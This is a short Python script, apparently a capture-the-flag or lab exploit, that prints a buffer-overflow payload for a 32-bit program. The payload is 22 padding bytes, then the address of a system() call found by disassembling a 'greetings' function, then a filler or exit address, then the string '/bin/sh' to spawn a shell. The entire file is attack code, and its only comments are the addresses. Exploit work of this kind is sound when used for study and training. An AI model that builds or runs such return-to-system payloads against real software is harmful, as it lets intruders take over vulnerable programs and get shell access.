import sys

"""
0x08048C12 -> start addr of system
    > disas greetings
    > 0x08048c12 <+29>:    call   0x804fef0 <system>
0xFFF6E0F4 -> filler or address_of_exit
"""

sys.stdout.buffer.write(
    b"A" * 22
    + 0x08048C12.to_bytes(4, "little")
    + 0xFFF6E0F4.to_bytes(4, "little")
    + b"/bin/sh"
)
